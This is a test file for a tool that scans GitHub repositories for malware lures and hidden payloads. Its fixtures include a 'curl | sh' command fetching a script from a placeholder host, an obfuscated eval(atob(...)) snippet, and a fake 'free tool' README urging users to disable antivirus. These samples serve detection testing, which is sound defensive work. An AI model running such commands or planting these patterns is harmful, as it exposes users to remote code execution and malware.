import { describe, expect, it } from "vitest";

import { GitHubClient } from "../src/engine/github";
import { scanRepo, scanTarball } from "../src/engine/scanner";
import { FakeGitHub, SHA, TarBuilder, chunked, makeTarball } from "./helpers";

const ref = { owner: "octo", repo: "demo" };
const NOW = () => new Date("2026-10-01T00:00:00Z");

async function scan(gh: FakeGitHub, limits = {}) {
  return scanRepo(ref, new GitHubClient({ fetch: gh.fetch }), { limits, now: NOW });
}

describe("scanRepo", () => {
  it("calls a harmless repository clean", async () => {
    const gh = new FakeGitHub();
    gh.tarball = makeTarball({ "README.md": "# Demo\n\nRun `npm test`.\n", "src/index.js": "console.log(1);\n" });
    const result = await scan(gh);
    expect(result).toMatchObject({ verdict: "clean", score: 0, partial: null, findings: [] });
    expect(result.repo?.headSha).toBe(SHA);
    expect(result.stats.textFiles).toBe(2);
    expect(result.rulesRun.length).toBeGreaterThan(20);
  });

  it("adds up a typical fake 'free tool' repository to dangerous", async () => {
    const gh = new FakeGitHub();
    gh.user = { created_at: "2026-09-27T00:00:00Z" };
    gh.repo = { ...gh.repo, created_at: "2026-09-29T00:00:00Z" };
    gh.tarball = makeTarball({
      "README.md":
        "# Free Tool\n\nDownload: https://www.mediafire.com/file/abc/Tool.zip\nPassword: 2026\n\nDisable your antivirus first.\n",
      "src/main.py": "print('hello')\n",
    });
    const result = await scan(gh);
    expect(result.verdict).toBe("dangerous");
    expect(Object.keys(result.ruleScores).sort()).toEqual(
      ["GR-LINK-001", "GR-LINK-003", "GR-LINK-004", "GR-REPO-001", "GR-SOC-001"].sort(),
    );
  });

  it("reports a repository over the size limit as incomplete, with metadata", async () => {
    const gh = new FakeGitHub();
    gh.repo = { ...gh.repo, size: 999_999_999 };
    const result = await scan(gh);
    expect(result.verdict).toBe("incomplete");
    expect(result.partial?.limit).toBe("maxRepoSizeKb");
    expect(result.stats.textFiles).toBe(0);
    expect(result.repo?.fullName).toBe("octo/demo");
    expect(gh.requests.some((r) => r.url.hostname === "codeload.github.com")).toBe(false);
  });

  it("keeps a suspicious verdict when a limit stops the scan", async () => {
    const gh = new FakeGitHub();
    const b = new TarBuilder().file("install.sh", "curl -s https://example.invalid/x.sh | sh\n");
    for (let i = 0; i < 20; i++) b.file(`f${i}.txt`, "x");
    gh.tarball = b.build();
    const result = await scan(gh, { maxEntries: 5 });
    expect(result.verdict).toBe("suspicious");
    expect(result.partial?.limit).toBe("maxEntries");
  });

  it("turns a spent time budget into an incomplete scan, not an error", async () => {
    const gh = new FakeGitHub();
    const result = await scan(gh, { timeBudgetMs: 0 });
    expect(result.verdict).toBe("incomplete");
    expect(result.partial?.limit).toBe("timeBudgetMs");
  });

  it("propagates GitHub errors", async () => {
    const gh = new FakeGitHub();
    gh.overrides.set("/repos/octo/demo", () => Response.json({}, { status: 404 }));
    await expect(scan(gh)).rejects.toMatchObject({ code: "not_found" });
  });
});

describe("scanTarball", () => {
  it("scans binary files too", async () => {
    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0]);
    const result = await scanTarball(chunked(makeTarball({ "bin/tool": elf })), null);
    expect(result.findings.map((f) => f.ruleId)).toEqual(["GR-BIN-001"]);
    expect(result.stats.binaryFiles).toBe(1);
  });
});

describe("files left out of the download archive", () => {
  const payload = 'eval(atob("Y29uc29sZS5sb2coImdpdHJheSB0ZXN0Iik="));\n';

  it("downloads hidden files separately and scans them", async () => {
    const gh = new FakeGitHub();
    gh.tarball = makeTarball({ "README.md": "# demo\n", ".gitattributes": "tools/ export-ignore\n" });
    gh.tree = [
      { path: ".gitattributes", type: "blob", size: 22 },
      { path: "README.md", type: "blob", size: 7 },
      { path: "tools", type: "tree", size: 0 },
      { path: "tools/helper.js", type: "blob", size: payload.length },
      { path: "vendor/lib", type: "commit", size: 0 },
    ];
    gh.rawFiles.set("tools/helper.js", payload);
    const result = await scan(gh);
    expect(result.archiveCheck).toEqual({ status: "hidden", hidden: 1, scanned: 1 });
    expect(result.findings.map((f) => [f.ruleId, f.path])).toEqual(
      expect.arrayContaining([
        ["GR-REPO-003", ""],
        ["GR-CODE-001", "tools/helper.js"],
      ]),
    );
    expect(result.verdict).toBe("suspicious");
    const raw = gh.requests.find((r) => r.url.hostname === "raw.githubusercontent.com");
    expect(raw?.headers.get("authorization")).toBeNull();
  });

  it("calls the scan incomplete when a hidden file cannot be downloaded", async () => {
    const gh = new FakeGitHub();
    gh.tree = [
      { path: "README.md", type: "blob", size: 7 },
      { path: "hidden.js", type: "blob", size: 10 },
    ];
    const result = await scan(gh);
    expect(result.archiveCheck).toEqual({ status: "hidden", hidden: 1, scanned: 0 });
    expect(result.partial?.limit).toBe("maxHiddenFiles");
    expect(result.verdict).toBe("incomplete");
  });

  it("is ok when the archive matches the commit, symlinks included", async () => {
    const gh = new FakeGitHub();
    gh.tarball = new TarBuilder().file("README.md", "# demo\n").symlink("docs", "README.md").build();
    gh.tree = [
      { path: "README.md", type: "blob", size: 7 },
      { path: "docs", type: "blob", size: 9 },
    ];
    const result = await scan(gh);
    expect(result.archiveCheck).toEqual({ status: "ok", hidden: 0, scanned: 0 });
    expect(result.verdict).toBe("clean");
  });

  it("does not block the scan when the file list is unavailable or cut short", async () => {
    const missing = new FakeGitHub(); // no tree: the API answers 404
    expect((await scan(missing)).archiveCheck.status).toBe("unavailable");

    const truncated = new FakeGitHub();
    truncated.tree = [{ path: "README.md", type: "blob", size: 7 }];
    truncated.treeTruncated = true;
    const result = await scan(truncated);
    expect(result).toMatchObject({ verdict: "clean", partial: null, archiveCheck: { status: "unavailable" } });
  });

  it("skips the comparison when the archive itself was only partly read", async () => {
    const gh = new FakeGitHub();
    const b = new TarBuilder();
    for (let i = 0; i < 10; i++) b.file(`f${i}.txt`, "x");
    gh.tarball = b.build();
    gh.tree = [{ path: "f0.txt", type: "blob", size: 1 }];
    const result = await scan(gh, { maxEntries: 3 });
    expect(result.archiveCheck.status).toBe("skipped");
    expect(gh.requests.some((r) => r.url.pathname.includes("/git/trees/"))).toBe(false);
  });
});
